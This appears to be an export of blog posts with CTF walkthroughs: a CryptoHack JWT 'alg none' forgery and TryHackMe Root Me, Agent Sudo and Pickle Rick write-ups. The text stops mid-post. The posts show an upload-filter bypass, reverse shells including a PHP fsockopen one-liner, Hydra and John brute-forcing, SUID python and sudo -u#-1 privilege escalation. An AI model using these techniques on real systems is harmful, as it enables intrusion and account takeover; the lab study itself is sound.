"/posts/cryptohack-no-way-jose/", "categories": "Crypto", "tags": "Challenge, Cryptohack, JWT, JSON, crypto, web", "date": "2022-06-14 00:00:00 +0000", "snippet": "In this challenge we are suppose to exploit a code based on JSON WEB TOKENS.as explained on the “token application” challenge : JavaScript Object Signing and Encryption (JOSE) is a framework specifying ways to securely transmit information on the internet. It’s most well-known for JSON Web Tokens (JWTs), which are used to authorise yourself on a website or application. JWTs typically do this by storing your “login session” in your browser after you have authenticated yourself by entering your username and password. In other words, the website gives you a JWT that contains your user ID, and can be presented to the site to prove who you are without logging in againIn this challenge we have to use this python code :import base64import jsonimport jwt # note this is the PyJWT module, not python-jwtSECRET_KEY = ?FLAG = ?@chal.route(&#39;/no-way-jose/authorise/&amp;lt;token&amp;gt;/&#39;)def authorise(token): token_b64 = token.replace(&#39;-&#39;, &#39;+&#39;).replace(&#39;_&#39;, &#39;/&#39;) # JWTs use base64url encoding try: header = json.loads(base64.b64decode(token_b64.split(&#39;.&#39;)[0] + &quot;===&quot;)) except Exception as e: return {&quot;error&quot;: str(e)} if &quot;alg&quot; in header: algorithm = header[&quot;alg&quot;] else: return {&quot;error&quot;: &quot;There is no algorithm key in the header&quot;} if algorithm == &quot;HS256&quot;: try: decoded = jwt.decode(token, SECRET_KEY, algorithms=[&#39;HS256&#39;]) except Exception as e: return {&quot;error&quot;: str(e)} elif algorithm == &quot;none&quot;: try: decoded = jwt.decode(token, algorithms=[&quot;none&quot;], options={&quot;verify_signature&quot;: False}) except Exception as e: return {&quot;error&quot;: str(e)} else: return {&quot;error&quot;: &quot;Cannot decode token&quot;} if &quot;admin&quot; in decoded and decoded[&quot;admin&quot;]: return {&quot;response&quot;: f&quot;Welcome admin, here is your flag: {FLAG}&quot;} elif &quot;username&quot; in decoded: return {&quot;response&quot;: f&quot;Welcome {decoded[&#39;username&#39;]}&quot;} else: return {&quot;error&quot;: &quot;There is something wrong with your session, goodbye&quot;}@chal.route(&#39;/no-way-jose/create_session/&amp;lt;username&amp;gt;/&#39;)def create_session(username): encoded = jwt.encode({&#39;username&#39;: username, &#39;admin&#39;: False}, SECRET_KEY, algorithm=&#39;HS256&#39;) return {&quot;session&quot;: encoded}We have a text box to get our token with our username and another box to decode our token.First, we have to understand how JWT works.Here is an exemple of JWT : “eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOmZhbHNlfQ.yRhbtEnBab1UfHM95yP6Ukz3EQrQqP6lwZFcqwvKwjg”This string is divided in 3 parts with a dotFirst part“eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9”.This first part is the header. This string is base64url encoded. You can decode it online and you get :{ &quot;typ&quot;:&quot;JWT&quot;, &quot;alg&quot;:&quot;HS256&quot;}So we see that the signature (third part) will be hashed with HS256 algorithm.Second part“eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOmZhbHNlfQ”Like the first part, this part is base64url encoded so we can decode it online and we get :{ &quot;username&quot;:&quot;admin&quot;, &quot;admin&quot;:false}Third part“yRhbtEnBab1UfHM95yP6Ukz3EQrQqP6lwZFcqwvKwjg”This part is the signature.To compute this signature, we have to concatenate the base64url encoded header with the base64url encoded payloadwith “.” between them and hash this string with the algorithm specified in the header with a secret key.The server will be able to know if the signature is correct because it knows the secret key so it can compute the signature itself and compare it with the given one.Solving this challengeNow we know how JWT works.In our payload we have{ &quot;username&quot;:&quot;admin&quot;, &quot;admin&quot;:false}The problem is we can’t change “admin”:false to “admin”:true because if we change the payload the base64url payload with change and the signature won’t be the same as one provided by the server.Let’s take a look to the given source code. if &quot;admin&quot; in decoded and decoded[&quot;admin&quot;]: return {&quot;response&quot;: f&quot;Welcome admin, here is your flag: {FLAG}&quot;}Here, we notice that we need to have “admin” as username.We also notice that we need to have “admin”:true in our payload.As we said previously we can change our payload but the server will reject it because of the signature. if algorithm == &quot;HS256&quot;: try: decoded = jwt.decode(token, SECRET_KEY, algorithms=[&#39;HS256&#39;]) except Exception as e: return {&quot;error&quot;: str(e)} elif algorithm == &quot;none&quot;: try: decoded = jwt.decode(token, algorithms=[&quot;none&quot;], options={&quot;verify_signature&quot;: False}) except Exception as e: return {&quot;error&quot;: str(e)} else: return {&quot;error&quot;: &quot;Cannot decode token&quot;}But here we have a problem !So, if the alorithm in the header is “HS256” (like in our case), the token will be decoded thanks to secret key. It’s impossible to change data because of this secret key.But, if algorithm is set to “none”, the payload will be decoded without checking the signature :decoded = jwt.decode(token, algorithms=[&quot;none&quot;], options={&quot;verify_signature&quot;: False})It is exactly what we want !We can change the algorithm to “none”. Encode the header in base64url. Change admin to true. Encode the payload in base64url and write anything as signature because it won’t be checked.Let’s do it !ExploitAs we said previously we change the algorithm to none :{ &quot;typ&quot;:&quot;JWT&quot;, &quot;alg&quot;:&quot;none&quot;}We encode this in base64url :YGBganNvbg0Kew0KICAgICJ0eXAiOiJKV1QiLA0KICAgICJhbGciOiJub25lIg0KfQ0KYGBgIANext, we change our payload with admin:true instead of admin:false :{ &quot;username&quot;:&quot;admin&quot;, &quot;admin&quot;:true}We encode it in base64url :ew0KDQogICAgInVzZXJuYW1lIjoiYWRtaW4iLA0KICAgICJhZG1pbiI6dHJ1ZQ0KfQWe do not need to change the signature because it won’t be checked.Now, we concatenate our parts with a dot between each part and we have :YGBganNvbg0Kew0KICAgICJ0eXAiOiJKV1QiLA0KICAgICJhbGciOiJub25lIg0KfQ0KYGBgIA.ew0KDQogICAgInVzZXJuYW1lIjoiYWRtaW4iLA0KICAgICJhZG1pbiI6dHJ1ZQ0KfQ.yRhbtEnBab1UfHM95yP6Ukz3EQrQqP6lwZFcqwvKwjgVoila, we have our own JWT. The server will decode the payload and see that the algoritm is “none” so it will read our payload without checking the signature !" }, { "title": "THM - Root Me", "url": "/posts/THM-root-me/", "categories": "Try Hack Me", "tags": "CTF, THM, easy, SUID, python", "date": "2022-06-05 00:00:00 +0000", "snippet": "Nmap└─$ nmap -A 10.10.103.188 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:21 EDTNmap scan report for 10.10.103.188Host is up (0.032s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: HackIT - Home|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 363.73 secondsEnumerationThe index page shows the text “Can you root me ?”I run dirsearch to find hidden directories└─$ dirsearch -u http://10.10.103.188/jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/10.10.103.188/-_22-06-05_15-30-52.txtError Log: /home/kali/.dirsearch/logs/errors-22-06-05_15-30-52.logTarget: http://10.10.103.188/[15:30:52] Starting: [15:30:55] 301 - 311B - /js -&amp;gt; http://10.10.103.188/js/ [15:31:19] 301 - 312B - /css -&amp;gt; http://10.10.103.188/css/ [15:31:34] 301 - 314B - /panel -&amp;gt; http://10.10.103.188/panel/ [15:31:50] 301 - 316B - /uploads -&amp;gt; http://10.10.103.188/uploads/ Task CompletedInteresting ! We got an uploads directory and a /panelOn the /panel we can upload files, i tried to upload a text file and it’s worked.All uploaded files are available in /uploads/Let’s try to upload a php file.Have been to revshells to gen a php reverse shellI have a message in Portuguese “PHP não é permitido!” So we can’t upload PHP files.Let’s try to bypass this securityFirst of all, we can try to replace the extension with PHP5. If the server simply checks the file extension and blocks the sending if it’s a PHP file then with PHP5 as extension it might allow it. Let’s test thisBINGO ! The file was upload !Let’s start the pwncat listener :─$ pwncat-cs -lp 4444 Go to upload/shell.php5Andddd perfect ! We have now a reverse shellPrivilege escalationchecking /home/ we see that we have two users :-rootme-testIn rootme’s directory we have .sudo_as_admin_successful so hijack rootme’s account might be interestingWe have user.txt /var/www/user.txt(remote)www-data@rootme:/tmp$cat /var/www/user.txt[redacted]On /html/ we have Website.zipI downloaded it.There’s nothing special insideWe have to check 4 things for privilege escalation:-sudo -l (impossible because we do not have www-data’s password) -Crontab (Nothing here) -Write access (All is fine)-SUID (Go !)Who’s there in the SUID ?(remote) www-data@rootme:/var$ find / -perm /4000 2&amp;gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.iputils/usr/bin/newuidmap/usr/bin/newgidmap/usr/bin/chsh/usr/bin/python/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexec/snap/core/8268/bin/mount/snap/core/8268/bin/ping/snap/core/8268/bin/ping6/snap/core/8268/bin/su/snap/core/8268/bin/umount/snap/core/8268/usr/bin/chfn/snap/core/8268/usr/bin/chsh/snap/core/8268/usr/bin/gpasswd/snap/core/8268/usr/bin/newgrp/snap/core/8268/usr/bin/passwd/snap/core/8268/usr/bin/sudo/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap-confine/snap/core/8268/usr/sbin/pppd/snap/core/9665/bin/mount/snap/core/9665/bin/ping/snap/core/9665/bin/ping6/snap/core/9665/bin/su/snap/core/9665/bin/umount/snap/core/9665/usr/bin/chfn/snap/core/9665/usr/bin/chsh/snap/core/9665/usr/bin/gpasswd/snap/core/9665/usr/bin/newgrp/snap/core/9665/usr/bin/passwd/snap/core/9665/usr/bin/sudo/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/9665/usr/lib/openssh/ssh-keysign/snap/core/9665/usr/lib/snapd/snap-confine/snap/core/9665/usr/sbin/pppd/bin/mount/bin/su/bin/fusermount/bin/ping/bin/umountIs there a strange program ? Of course, yes ! Python is a SUID file !If we start a shell with python , the shell will be started as root.Perfect !Going to GTFOBIN we see how to use SUID to get root with pythonSimply copy&amp;amp;paste this command :(remote) www-data@rootme:/tmp$ python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;(remote)root@rootme:/tmp$ whoamiroot(remote)root@rootme:/tmp$Voila, we are root(remote)root@rootme:/tmp$ cat /root/root.txt[redacted]" }, { "title": "THM - Agent Sudo ", "url": "/posts/THM-agent-sudo/", "categories": "Try Hack Me", "tags": "CTF, THM, easy, binwalk, bruteforce, hydra, ftp, ssh, stegano", "date": "2022-06-05 00:00:00 +0000", "snippet": "EnumerationNmapLet’s start by using nmap to see which ports are openPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Annoucement|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.31 secondsWe have 3 services: -FTP-SSH-HTTPFTP (21)─$ ftp 10.10.87.101 Connected to 10.10.87.101.220 (vsFTPd 3.0.3)Name (10.10.87.101:kali): anonymous331 Please specify the password.Password: 530 Login incorrect.ftp: Login failedftp&amp;gt; We can’t connect amously to ftp :/ Let’s put it aside and come back to it later.Port 80When we go to the ip with Firefox we have a blank page with this text:Dear agents, Use your own codename as user-agent to access the site. From,Agent RSo, i guess that R is the code name of one agent.Let’s bruteforce codename from A to Z to access the websiteWe can use BurpSuite to do this.First, we add tags around User-agent and burp will replace this user-agent by our text (here, all the letters of the alphabet).Now, we choose by what we want to replace the user-agent on each request.After what we can press “start attack” and see results.By looking result we see that the status is different for “C”. We have a redirectionWe have this message :Attention chris,Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From,Agent RSo a user “chris” have a weak password.We can try to bruteforce the FTP server or the SSH one.We also discover an Agent J.Let’s use Hydra to bruteforce the FTP server with rockyou.└─$ hydra -s 21 -l chris -P /usr/share/wordlists/rockyou.txt -t 16 10.10.87.101 ftpHydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-06 10:52:29[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ftp://10.10.87.101:21/[21][ftp] host: 10.10.87.101 login: chris password: crystal1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-06 10:53:29┌──(kali㉿kali)-[~/Desktop/ctf]└─$ Eheh, it’s worked !Thanks to Hydra We now have chris’ password. Connecting to FTP with chris’ creds└─$ ftp 10.10.87.101Connected to 10.10.87.101.220 (vsFTPd 3.0.3)Name (10.10.87.101:kali): chris331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||42608|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png226 Directory send OK.In “To_agentJ.txt” we have :Dear agent J,All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#39;t be a problem for you.From,Agent CUh, i hate steganography…I had no result with steghide and exiftool but with binwalk we see that a zip file is in cutie.png└─$ binwalk cutie.png DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced869 0x365 Zlib compressed data, best compression34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt34820 0x8804 End of Zip archive, footer length: 22we exctract it with binwalk -e.└─$ binwalk cutie.png -eDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced869 0x365 Zlib compressed data, best compression34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt34820 0x8804 End of Zip archive, footer length: 22┌──(kali㉿kali)-[~/Desktop/ctf]└─$ lscute-alien.jpg cutie.png _cutie.png.extracted To_agentJ.txt┌──(kali㉿kali)-[~/Desktop/ctf]└─$ cd _cutie.png.extracted ┌──(kali㉿kali)-[~/Desktop/ctf/_cutie.png.extracted]└─$ l 365 365.zlib 8702.zip To_agentR.txt└─$ unzip 8702.zipArchive: 8702.zipskipping: To_agentR.txt need PK compat. v5.1 (can do v4.6)8702.zip is encrytped, we can use zip2john to bruteforce it.┌──(kali@kali)-[~/Desktop/ctf/_cutie.png.extracted]└─$ zip2john 8702.zip &amp;gt; hash┌──(kali@kali)-[~/Desktop/ctf/_cutie.png.extracted]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])Cost 1 (HMAC size) is 78 for all loaded hashesWill run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusalien (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE (2022-06-06 11:03) 1.666g/s 40960p/s 40960c/s 40960C/s michael!..280789Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. ┌──(kali㉿kali)-[~/Desktop/ctf/_cutie.png.extracted]└─$ Again, John is too strong !Let’s extract it with “7z e 8702.zip” and using alien as password.Now, we can see the content of To_agentR.txt :Agent C,We need to send the picture to &#39;QXJlYTUx&#39; as soon as possible!By,Agent RWe have to decrypt “QXJlYTUx”. Using cyberchef we have.It’s just a base64 enconding.QXJlYTUx means Area51Now we can try to use this password with steghide to see if a message is hidden in one of the two initial pictures└─$ steghide --extract -sf cute-alien.jpgEnter passphrase: wrote extracted data to &quot;message.txt&quot;.Yes ! “message.txt” is inside ! Let’s read it.┌──(kali㉿kali)-[~/Desktop/ctf]└─$ cat message.txt Hi james,Glad you find this message. Your login password is hackerrules!Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.Your buddy,chrisAlright ! We have a login:password → james:hackerrules!Moove to ssh !SSH└─$ ssh james@10.10.87.101 The authenticity of host &#39;10.10.87.101 (10.10.87.101)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.87.101&#39; (ED25519) to the list of known hosts.james@10.10.87.101&#39;s password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)* Documentation: https://help.ubuntu.com* Management: https://landscape.canonical.com* Support: https://ubuntu.com/advantageSystem information as of Mon Jun 6 15:10:27 UTC 2022System load: 0.0 Processes: 97Usage of /: 39.7% of 9.78GB Users logged in: 0Memory usage: 34% IP address for eth0: 10.10.87.101Swap usage: 0%75 packages can be updated.33 updates are security updates.Last login: Tue Oct 29 14:26:27 2019james@agent-sudo:~$ it’s worked !Because of the machine’s name, i tried first “sudo -l” to see if we have any special rights.james@agent-sudo:~$ sudo -l[sudo] password for james: Matching Defaults entries for james on agent-sudo:env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on agent-sudo:(ALL, !root) /bin/bashWe can’t run bash as root but by googling this strange syntax i saw a security bypass in sudo 1.8.27 to run bash as root despite this commandjames@agent-sudo:~$ sudo -VSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2james@agent-sudo:~$ We have sudo 1.8.21p, our sudo version is vulnerable !As we can see here we can bypass “(ALL, !root) /bin/bash” by typing “sudo -u#-1 /bin/bash”james@agent-sudo:~$ sudo -u#-1 /bin/bashroot@agent-sudo:~# cat /root/root.txt To Mr.hacker,Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is [REDACTED]By,DesKel a.k.a Agent Rroot@agent-sudo:~# cat /home/james/user_flag.txt [REDACTED]root@agent-sudo:~#Thanks for reading !" }, { "title": "THM - Picke Rick", "url": "/posts/THM-pickle-rick/", "categories": "Try Hack Me", "tags": "CTF, THM, easy", "date": "2022-06-01 00:00:00 +0000", "snippet": "NmapAs always, we start by scanning all opened ports with nmap└─$ nmap -A 10.10.164.56 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 14:14 EDTNmap scan report for 10.10.164.56Host is up (0.39s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ab:c3:10:24:d6:f4:ca:55:b0:05:5e:87:64:7f:9e:6e (RSA)| 256 bc:a3:39:f2:c7:88:80:1b:eb:1d:59:02:8a:dd:b2:3e (ECDSA)|_ 256 bd:01:ce:77:8f:1b:93:dd:b3:c4:0d:40:15:05:1b:50 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Rick is sup4r cool|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds Opened ports : 22 80 Port 80I’ve found in the source code of index.php : &amp;lt;!-- Note to self, remember username! Username: R1ckRul3s --&amp;gt;One user is : “R1ckRul3s”Let’s launch dirseach to find hidden directories/pages. └─$ dirsearch -u http://10.10.164.56 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/10.10.164.56/_22-06-01_14-15-57.txtError Log: /home/kali/.dirsearch/logs/errors-22-06-01_14-15-57.logTarget: http://10.10.164.56/[14:15:57] Starting: [14:16:16] 200 - 2KB - /assets/ [14:16:28] 200 - 1KB - /index.html [14:16:31] 200 - 882B - /login.php [14:16:41] 200 - 17B - /robots.txt Task Completed Nothing in assetsBut we have a login.php page.I tried several SQL injections but none succeededThe robots.txt file contains “Wubbalubbadubdub”.I don’t know what’s the meaning of that but i kept it aside.Logged inSimple : “Wubbalubbadubdub” is just the R1ckRul3s password.When we are logged we access to portal.php wich contains a textbox where we are able to enter commands.In the source code we get “Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==”Use shell to decode this base64 encoding… ➜ ~ echo &quot;Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==&quot; | base64 -dVmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=base64: entrée incorrecte➜ ~ echo &quot;Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==&quot; | base64 -d VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=base64: entrée incorrecte➜ ~ echo &quot;VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=&quot; | base64 -dVjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0 ➜ ~ echo &quot;VjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0&quot; | base64 -dV1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=base64: entrée incorrecte➜ ~ echo &quot;V1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=&quot; | base64 -dWTIxR2FWbHRiREJKUjJoMllrZFZQUT09% ➜ ~ echo &quot;WTIxR2FWbHRiREJKUjJoMllrZFZQUT09&quot; | base64 -d Y21GaVltbDBJR2h2YkdVPQ== ➜ ~ echo &quot;Y21GaVltbDBJR2h2YkdVPQ==&quot; | base64 -d cmFiYml0IGhvbGU=% ➜ ~ echo &quot;cmFiYml0IGhvbGU=&quot; | base64 -drabbit hole ➜ ~ When we decode a string we get another encoded string until we have this message : “rabbit hole”, well…Entering “ls” in the portal.php text box, the output isls Sup3rS3cretPickl3Ingred.txtassetsclue.txtdenied.phpindex.htmllogin.phpportal.phprobots.txtif we make “cat Sup3rS3cretPickl3Ingred.txt” we can’t because the cat command is bannedWe can bypass the banning mechanism thanks to “base64” commandWe can print file content by using base64 command and we decode the content in our machine➜ ~ base64 Sup3rS3cretPickl3Ingred.txt[first flag]We make the same for login.php to see what are banned commands➜ ~ base64 login.phpPD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKaWYoJF9TRVNTSU9OWyJsb2dpbiJdID09IGZhbHNlKSB7CiAgIGhlYWRlcigiTG9jYXRpb246IC9sb2dpbi5waHAiKTsgZGllKCk [...too long..] saVJtaG9UVmhDYjFac1dtRldNVnBXVFZWV2FHVnFRVDA9PSAtLT4KICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==Decoded content &amp;lt;?phpsession_start();if($_SESSION[&quot;login&quot;] == false) { header(&quot;Location: /login.php&quot;); die();}?&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Rick is sup4r cool&amp;lt;/title&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;assets/bootstrap.min.css&quot;&amp;gt; &amp;lt;script src=&quot;assets/jquery.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&quot;assets/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;nav class=&quot;navbar navbar-inverse&quot;&amp;gt; &amp;lt;div class=&quot;container&quot;&amp;gt; &amp;lt;div class=&quot;navbar-header&quot;&amp;gt; &amp;lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&amp;gt;Rick Portal&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;ul class=&quot;nav navbar-nav&quot;&amp;gt; &amp;lt;li class=&quot;active&quot;&amp;gt;&amp;lt;a href=&quot;#&quot;&amp;gt;Commands&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&quot;/denied.php&quot;&amp;gt;Potions&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&quot;/denied.php&quot;&amp;gt;Creatures&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&quot;/denied.php&quot;&amp;gt;Potions&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&quot;/denied.php&quot;&amp;gt;Beth Clone Notes&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;div class=&quot;container&quot;&amp;gt; &amp;lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&amp;gt; &amp;lt;h3&amp;gt;Command Panel&amp;lt;/h3&amp;gt;&amp;lt;/br&amp;gt; &amp;lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;command&quot; placeholder=&quot;Commands&quot;/&amp;gt;&amp;lt;/br&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Execute&quot; class=&quot;btn btn-success&quot; name=&quot;sub&quot;/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;?php function contains($str, array $arr) { foreach($arr as $a) { if (stripos($str,$a) !== false) return true; } return false; } // Cant use cat $cmds = array(&quot;cat&quot;, &quot;head&quot;, &quot;more&quot;, &quot;tail&quot;, &quot;nano&quot;, &quot;vim&quot;, &quot;vi&quot;); if(isset($_POST[&quot;command&quot;])) { if(contains($_POST[&quot;command&quot;], $cmds)) { echo &quot;&amp;lt;/br&amp;gt;&amp;lt;p&amp;gt;&amp;lt;u&amp;gt;Command disabled&amp;lt;/u&amp;gt; to make it hard for future &amp;lt;b&amp;gt;PICKLEEEE RICCCKKKK&amp;lt;/b&amp;gt;.&amp;lt;/p&amp;gt;&amp;lt;img src=&#39;assets/fail.gif&#39;&amp;gt;&quot;; } else { $output = shell_exec($_POST[&quot;command&quot;]); echo &quot;&amp;lt;/br&amp;gt;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&quot;; } } ?&amp;gt; &amp;lt;!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== --&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;banned command are : cat head more tail nano vim viWe can’t directly print file content (we have to encode it with base64) but we can certainly start a reverse shellphp -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;Listener :└─$ nc -lvp 1234listening on [any] 1234 ...10.10.164.56: inverse host lookup failed: Unknown hostconnect to [10.8.80.139] from (UNKNOWN) [10.10.164.56] 52060 ┌──(kali㉿kali)-[~]└─$ I tried sooo much reverse shell but none worked… The connection was always closed after it was establishedSo, let’s forget 